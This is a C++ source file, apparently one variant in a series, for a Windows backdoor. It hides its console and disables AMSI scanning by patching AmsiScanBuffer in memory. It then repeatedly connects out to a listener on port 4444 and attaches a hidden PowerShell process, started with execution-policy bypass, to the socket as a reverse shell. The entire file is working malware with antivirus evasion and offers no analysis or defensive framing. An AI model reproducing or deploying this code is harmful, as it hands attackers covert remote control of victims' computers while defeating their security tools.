// (equivalent to Variant 3 – threaded I/O + very naive AMSI patch attempt)
// cl backdoor4.cpp ws2_32.lib user32.lib /O2 /MT

#include <winsock2.h>
#include <windows.h>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

const char* HOST = "127.0.0.1";
const u_short PORT = 4444;
const int BUFFER_SIZE = 8192;

void PatchAMSI_Naive() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    FARPROC p = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!p) return;

    DWORD old;
    VirtualProtect((LPVOID)p, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)p = 0xC3;  // ret
    VirtualProtect((LPVOID)p, 1, old, &old);
}

DWORD WINAPI SockToProc(LPVOID lp) {
    SOCKET s = (SOCKET)lp;
    HANDLE hPipe = (HANDLE)s;  // abusing handle

    char buf[BUFFER_SIZE];
    while (true) {
        int r = recv(s, buf, BUFFER_SIZE, 0);
        if (r <= 0) break;
        DWORD written;
        WriteFile(hPipe, buf, r, &written, NULL);
    }
    return 0;
}

DWORD WINAPI ProcToSock(LPVOID lp) {
    SOCKET s = (SOCKET)lp;
    HANDLE hPipe = (HANDLE)s;

    char buf[BUFFER_SIZE];
    while (true) {
        DWORD read;
        if (!ReadFile(hPipe, buf, BUFFER_SIZE, &read, NULL) || read == 0) break;
        send(s, buf, read, 0);
    }
    return 0;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    PatchAMSI_Naive();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(4000 + (GetTickCount() % 5000));
            continue;
        }

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, HOST, &addr.sin_addr);

        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(s);
            Sleep(4000 + (GetTickCount() % 5000));
            continue;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmd[] = "powershell.exe -NoP -NonI -W Hidden -EP Bypass -C $null";

        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(s);
            continue;
        }

        CreateThread(NULL, 0, SockToProc, (LPVOID)s, 0, NULL);
        CreateThread(NULL, 0, ProcToSock, (LPVOID)s, 0, NULL);

        WaitForSingleObject(pi.hProcess, INFINITE);
        closesocket(s);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WSACleanup();
    return 0;
}